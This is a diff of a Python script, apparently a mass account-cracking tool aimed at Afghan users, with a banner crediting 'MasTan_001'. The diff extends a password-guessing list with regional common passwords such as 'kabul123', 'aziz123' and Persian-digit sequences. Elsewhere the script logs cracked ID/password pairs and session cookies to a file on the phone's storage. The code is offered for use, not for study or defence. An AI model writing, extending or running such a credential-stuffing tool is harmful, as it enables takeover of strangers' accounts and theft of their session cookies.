@@ -41,13 +41,7 @@ $$$$$$$$ |$$  __$$\ $$\$$\$$ $$ | \____$$\ $$  __$$ |
 $$  __$$ |$$ |  $$ |$$ \$$$  $$ | $$$$$$$ |$$ /  $$ |
 $$ |  $$ |$$ |  $$ |$$ |\$  /$$ |$$  __$$ |$$ |  $$ |
 $$ |  $$ |$$ |  $$ |$$ | \_/ $$ |\$$$$$$$ |\$$$$$$$ |
-\__|  \__|\__|  \__|\__|     \__| \_______| \_______|
-                                                     
-                                                     
-                                                     
-
-                                                     
-                                                     
+\__|  \__|\__|  \__|\__|     \__| \_______| \_______|                                           
 
 [*]----------------------------------------------
 [*] Author         : MasTan_001
@@ -141,7 +135,7 @@ def awmafghan():
 			for psx in user:
 				ids = code+psx
 				if pcs in ['1','01']:
-					passlist = [psx,ids,'afghan','afghan12345','afghan123','afghanistan','500500','100200','10002000','kabul123','Afghan123','Afghanistan','۱۲۳۴۵۶','۱۲۳۴۵۶۷۸۹', '۱۰۰۲۰۰','۵۰۰۵۰۰','۵۰۰۶۰۰']
+					passlist = [psx,ids,'aziz123','ahmad123','kabuljan12345','kabuljan','afghan','afghan12345','afghan123','afghanistan','500500','100200','10002000','kabul123','Afghan123','Afghanistan','۱۲۳۴۵۶','۱۲۳۴۵۶۷۸۹', '۱۰۰۲۰۰','۵۰۰۵۰۰','۵۰۰۶۰۰']
 				if mthd in ['1','01']:
 					AWM.submit(rndm,ids,passlist)
 		print('\033[1;37m')
@@ -300,7 +294,7 @@ def rndm(ids,passlist):
                                                         oks.append(ids)
                                                         break
                                         except:
-                                                print('\r\r\033[1;32m [Ahmad-OK] '+str(uid)+' | '+pas+'\033[1;97m')
+                                                print('\r\r\033[1;32m [AhMad-OK] '+str(uid)+' | '+pas+'\033[1;97m')
                                                 print('\r\r\033[0;95m [🍪] %s   '%(coki))
                                                 open('/sdcard/AhMad-OK-OK.txt','a').write(uid+'|'+pas+'\n')
                                                 oks.append(ids)
